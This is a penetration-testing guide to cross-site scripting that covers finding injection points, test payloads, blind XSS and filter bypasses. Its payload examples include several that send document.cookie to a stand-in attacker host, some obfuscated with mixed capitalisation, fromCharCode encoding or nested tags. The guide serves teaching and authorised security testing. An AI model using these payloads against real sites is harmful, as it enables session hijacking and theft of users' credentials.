# Cross-site scripting (XSS)

* An XSS vulnerability is an input validation error.
* All the input data in an application could be susceptible to XSS or other input validation vulnerabilities. The
  fields in forms are the obvious targets, but all inputs are candidates, including application control flow
  parameters.
* An HTTP proxy cuts through client-side security controls and exposes the raw request. Input validation belongs in
  the backend, not the browser.
* Different encodings and payload variants reveal different gaps. Developers often rely on blocklists and allowlists;
  these can sometimes be bypassed with enough variation.

## Steps

1. Look for user input opportunities on the application. When user input is stored and used to construct a web page
   later, test the input field for stored XSS. If user input in a URL gets reflected back on the resulting web page,
   test for reflected and DOM XSS.
2. Insert XSS payloads into the user input fields found. Draw payloads from lists online, a polyglot payload, or a
   generic test string.
3. Confirm the impact by checking whether the browser runs the injected JavaScript. For a blind XSS, check whether the
   victim browser can be made to generate a request to an attacker-controlled server.
4. Where no payload executes, try bypassing XSS protections.
5. Automate the XSS hunting process.
6. Consider the impact: who does it target, how many users can it affect, and what does it achieve? Can it be escalated
   using what has been found?
7. Create an XSS report.

## Look for input opportunities

Turn on the proxy’s traffic interception and modify the request before forwarding it to the server. In Burp, the request
can be edited directly in the Proxy tab; clicking Forward sends it on.

For stored XSS, the places to search are where input gets stored by the server and later displayed: comment fields, user
profiles, and blog posts. The input most often reflected back is forms, search boxes, and name and username fields in
sign-ups. Drop-down menus and numeric fields sometimes allow XSS too, because even where the browser blocks the payload,
the Zap or Burp proxy can insert it directly into the request.

For reflected and DOM XSS, the targets are user input in URL parameters, fragments, or pathnames that get displayed
back. A custom string inserted into each URL parameter, and into every other user-input opportunity, then searched for
in the page source (View Source, usually CTRL-F), shows which input fields appear in the resulting web page.

Note: There is JS code that is using some data which can be controlled unsafely, like `location.href`. This can be used
to execute arbitrary JavaScript code in DOM based XSS.

## Insert payloads

Once user-input opportunities present in an application have been identified, start entering a test XSS payload at the
discovered injection points. The simplest payload to test with is an alert box:

```html
<script>alert('Hello World');</script>
```

Most websites nowadays implement some sort of XSS protection on their input fields, and this payload will not work. A
simple payload like this one is more likely to work on IoT or embedded applications that do not use the latest
frameworks.

### More than script tag

Some HTML attributes allow for specifying a script to run if certain conditions are met. For example, the `onload` event
attribute runs a specific script after the HTML element has loaded:

```text
<img onload=alert("The picture has been loaded!") src="example.png">
```

The `onclick` event attribute specifies the script to be executed when the element is clicked, and `onerror` specifies
the script to run in case an error occurs loading the element. Code inserted into these attributes, or a new event
attribute added to an HTML tag, creates an XSS.

Another way of achieving XSS is through special URL schemes, like `javascript:` and `data:`. The `javascript:` URL
scheme allows for executing JavaScript code specified in the URL. For example, entering this URL will cause an alert box
with the text "Hello World" to appear:

```text
javascript:alert('Hello World')
```

Data URLs that use the `data:` scheme, allow for embedding small files in a URL:

```text
data:text/html;base64,PHNjcmlwdD5hbGVydCgnSGVsbG8gV29ybGQnKTwvc2NyaXB0Pg=="
```

`PHNjcmlwdD5hbGVydCgnSGVsbG8gV29ybGQnKTwvc2NyaXB0Pg==` is the base64 encoded form of
`<script>alert('Hello World')</script>`.

Documents contained within `data:` URLs do not need to be base64 encoded, but base64 encoding often helps bypass XSS
filters. There are many more ways to execute JavaScript code to bypass XSS protection. See the cheatsheets.

### Closing out HTML tags

```html
<img src="USER_INPUT">
```

The payload has to include the ending of an `img` tag before the JavaScript:

```html
"/>
<script>location="http://attacker.com";</script>
```

Injected, the resulting HTML will look like this:

```html
<img src=""/>
<script>location="http://attacker.com";</script>">
```

If a payload is not working, check whether it caused syntax errors in the returned document by inspecting that document
in the proxy for unclosed tags or other syntax issues.

### Improving effectiveness

Another way of approaching manual XSS testing is to insert an XSS polyglot, a type of XSS payload that executes in
multiple contexts.

Example:

```text
javascript:"/*\"/*`/*' /*</template>
</textarea></noembed></noscript></title>
</style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>
```

Another way of testing for XSS more efficiently is to use generic test strings instead of XSS payloads. Insert a string
of special HTML characters often used in XSS payloads, such as the following: >'<"//:=;!--. Take note of which ones the
application escapes and which get rendered directly. Then construct test XSS payloads from the characters the
application is not properly sanitising.

## Blind XSS

Blind XSS flaws are harder to detect: they cannot be found by looking for reflected input, nor tested by generating an
alert box. Instead, the victim’s browser is made to generate a request to an attacker-controlled server. The following
payload, for example, makes the victim’s browser request the page `/xss`:

```html

<script src='http://YOUR_SERVER_IP/xss'></script>
```

Monitor the server logs for a request to that page. A request to `/xss` means a blind XSS has been
triggered. [XSS Hunter](https://xsshunter.com/features) can automate this process.

## Confirm the impact

Check for the payload on the destination page.

Sites might also use user input to construct something other than the next returned web page. The input could show up in
future web pages, email, and file portals.

A time delay also might occur between when the payload is submitted and when the user input is rendered. This situation
is common in log files and analytics pages. For these, the payload might not execute until later, or in another user’s
account.

Some XSS payloads will execute in certain contexts, such as when an admin is logged in or when the user actively clicks,
or hovers over, certain HTML elements. Confirm the impact of the XSS payload by browsing to the necessary pages and
performing those actions.

## Bypassing protections

Most applications implement some sort of XSS protection in their input fields. Common is using a blocklist to filter out
dangerous expressions that might be indicative of XSS. This type of protection can be bypassed.

Alternative JavaScript syntax: Some applications will sanitise `script` tags in user input. In that case, XSS that does
not use a `script` tag may still execute. Instead of:

```html
<img src="/><script>alert('Hello World');</script>"/>
```

Use:

```html
<img src="odear" onerror="alert('Hello World');"/>
```

And this snippet will create a `Click me!` link that will generate an alert box when clicked:

```html
<a href="javascript:alert('Hello World')>Click me!</a>"
```

Capitalisation and encoding: mixing different encodings and capitalisations can confuse the XSS filter. Where the filter
matches only the string "script", capitalising some letters in the payload gets past it. Browsers often parse HTML
permissively and allow minor syntax issues like capitalisation, so this does not affect how the script tag is
interpreted:

```html

<scrIPT>location='http://attacker_server_ip/c='+document.cookie;</scrIPT>
```

If the application filters special HTML characters like single and double quotes, strings cannot be written into the
payload directly.

The JavaScript `fromCharCode()` function can create the needed string. For example, this piece of code is equivalent to
the string `http://attacker_server_ip/?c=`:

```js
String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107,
101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61)
```

And construct an XSS payload without quotes:

```text
<scrIPT>location=String.fromCharCode(104, 116, 116, 112, 58, 47,
47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118,
101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;</scrIPT>
```

The following translates an exploit string to an ASCII number sequence (using an online JavaScript editor,
like [js.do](https://js.do/)):

```text
<script>
function ascii(c){
    return c.charCodeAt();
}
encoded = "INPUT_STRING".split("").map(ascii);
document.write(encoded);
</script>
```

For example, translating the script with payload `http://attacker_server_ip/?c=`:

```text
<script>
function ascii(c){
return c.charCodeAt();
}
encoded = "http://attacker_server_ip/?c=".split("").map(ascii);
document.write(encoded);
</script>
```

This JavaScript prints
`104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61`,
which then constructs the payload via the `fromCharCode()` method.

Filter logic errors: errors in the filter logic are exploitable too. Sometimes an application removes all `script` tags
from user input but does it only once. In that case a payload like this works:

```text
<scrip<script>t>location='http://attacker_server_ip/c='+document.cookie;</scrip</script>t>
```

The filter won’t recognise those broken tags as legitimate, but once the filter removes the intact tags from this
payload, the rendered input becomes a perfectly valid piece of JavaScript code:

```html

<script>location='http://attacker_server_ip/c='+document.cookie;</script>
```

## Escalation

XSS attacks can result in:

* Hijacking a user’s session, using credentials to access other sites or redirect the user to unintended websites.
* Altering website pages or inserting sections into a web page.
* Executing scripts to extract sensitive information from cookies or databases.

The impact varies. The type of XSS determines the number of users who could be affected.

* Stored XSS on a public forum can realistically attack anyone who visits that forum page, so stored XSS is considered
  the most severe.
* Reflected or DOM XSS can affect only users who click the malicious link.
* Self-XSS requires a lot of user interaction and social engineering to execute.

The identities of the affected users are worth attention too. If a stored XSS vulnerability is on a site’s server logs, the XSS can
affect system administrators and allow attackers to take over their sessions. Since the affected users are accounts of
high privilege, the XSS can compromise the integrity of the entire application. Access to customer data, internal files,
and API keys may follow, and the attack may even escalate into RCE by uploading a shell or executing scripts as the
admin.

* In a brochure-ware application, where all users are anonymous and all information is public, the impact will often be
  minimal.
* In an application holding sensitive data, such as banking transactions, emails, or healthcare records, the impact will
  usually be serious.
* If the compromised user has elevated privileges within the application, then the impact will generally be critical,
  allowing the attacker to take full control of the vulnerable application and compromise all users and their data.

## Variants

The three types are reflected, stored, and DOM-based, each landing in a particular context:
HTML body, an HTML attribute, a JavaScript string or template literal, a URL, or a framework
expression such as AngularJS. Exploitation runs to cookie theft, password capture, and
performing CSRF. The long tail is the filter and CSP bypass ladder: contexts with angle
brackets or quotes encoded, most tags or attributes blocked, only custom tags or some SVG
allowed, AngularJS sandbox escapes, and dangling-markup or CSP bypasses against a strict
policy. Closely related is [open redirection](redirects.md), where a JavaScript URL crosses
into script execution. The [client-side attacks runbook](../runbooks/client-side.md) covers
detection across contexts and the bypass work.

## Resources

* [Portswigger: Cross-site scripting](https://portswigger.net/web-security/cross-site-scripting)
* [OWASP: Cross Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
* [OWASP: Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
* [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
* [Portswigger XSS cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/)

## Counter moves

Cross-site scripting (XSS) is the case here. These come back to the same answers: validated input, encoded output,
server-side authorisation, and patched dependencies. The defensive counterpart is in the blue notes
on [the application layer as a target](https://blue.tymyrddin.dev/docs/counter/app/).
